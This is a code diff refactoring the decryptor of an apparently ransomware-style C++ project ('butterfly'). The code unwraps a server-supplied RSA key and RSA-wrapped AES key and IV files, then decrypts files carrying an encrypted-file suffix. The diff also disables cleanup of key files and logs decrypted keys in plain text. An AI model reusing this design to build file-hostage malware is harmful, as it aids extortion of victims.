@@ -19,11 +19,11 @@ Decryptor::~Decryptor()
 
 }
 
-void Decryptor::startWithDir(const std::string &path)
+void Decryptor::invokeDir(const std::string &path)
 {
 
     std::string aesk = decryptAESKey(_decryptedCPrivateRSA, "AESKey.bin");
-    //std::string aesiv = butterfly::readBinFile("AESIV.txt");
+    std::string aesiv = decryptAESKey(_decryptedCPrivateRSA, "AESIV.bin");
     /*
     try
     {
@@ -43,7 +43,7 @@ void Decryptor::startWithDir(const std::string &path)
         {
             filepath.erase(filepath.length() - butterfly::ENCRYPTED_FILE_ENDING.length());
         }
-        decryptFileWithAES(filepath, aesk, "aesiv");
+        decryptFileWithAES(filepath, aesk, aesiv);
         /*
         auto data = _aesKeyDatabase->getEntry(filepath);
 
@@ -57,9 +57,9 @@ void Decryptor::startWithDir(const std::string &path)
         }
         */
     }
-    butterfly::removeFile("AESKey.bin");
-    butterfly::removeFile("AESKey.txt");
-    butterfly::removeFile("AESIV.txt");
+    //butterfly::removeFile("AESKey.bin");
+    //butterfly::removeFile("AESKey.txt");
+    //butterfly::removeFile("AESIV.txt");
 }
 
 std::string Decryptor::decryptCPrivateRSA(const std::string &keyFromServer)
@@ -81,8 +81,6 @@ std::string Decryptor::decryptCPrivateRSA(const std::string &keyFromServer)
     {
         LOG_ERROR(e.what());
     }
-
-
 
     return _decryptedCPrivateRSA;
 }
@@ -109,34 +107,11 @@ std::string Decryptor::decryptAESKeyFile(const std::string &aesKeyFile)
     return _decryptedAESKey;
 }
 
-std::string Decryptor::decryptAESIVFile(const std::string &aesKeyFile)
+void Decryptor::decryptFileWithAES(const std::string &filepath, const std::string &aeskey, const std::string &aesiv)
 {
-
-    _rsaDecryptorAESIV = std::make_shared<rsa::RSADecryptor>(_decryptedCPrivateRSA);
-
-    std::string encAESKey = _rsaDecryptorAESIV->getBinKeyFileContents(aesKeyFile);
-    EVP_PKEY *aesKeyPKey = _rsaDecryptorAESIV->getEvpPkey();
-
-    try
-    {
-        _rsaDecryptorAESIV->decrypt(aesKeyPKey, encAESKey);
-        _decryptedAESIV = _rsaDecryptorAESIV->getDecryptedKey();
-        LOG_TRACE("Decrypted AES IV: " << _decryptedAESIV);
-        butterfly::writeBinFile("AESIV.txt", _decryptedAESIV.c_str(), static_cast<long>(_decryptedAESIV.length()));
-
-    } catch (RSADecryptionException &e)
-    {
-        LOG_ERROR(e.what());
-    }
-
-    return _decryptedAESIV;
-}
-
-void Decryptor::decryptFileWithAES(const std::string &filepath, const std::string &, const std::string &)
-{
-    std::string aeskey = butterfly::readBinFile("AESKey.txt");
+    //std::string aeskey = butterfly::readBinFile("AESKey.txt");
     _aesDecryptor->setAESKey(aeskey);
-    std::string aesiv = butterfly::readBinFile("AESIV.txt");
+    //std::string aesiv = butterfly::readBinFile("AESIV.txt");
     _aesDecryptor->setAESIv(aesiv);
 
     try
@@ -162,7 +137,7 @@ std::string Decryptor::decryptAESKey(const std::string &decryptedCPrivateRSA, co
     {
         _rsaDecryptorAESKey->decrypt(aesKeyPKey, encAESKey);
         _decryptedAESKey = _rsaDecryptorAESKey->getDecryptedKey();
-        LOG_TRACE("Decrypted AES Key: " << _decryptedAESKey);
+        LOG_TRACE("Decrypted Content from file " << aesKeyFile << " :" << _decryptedAESKey);
 
     } catch (RSADecryptionException &e)
     {
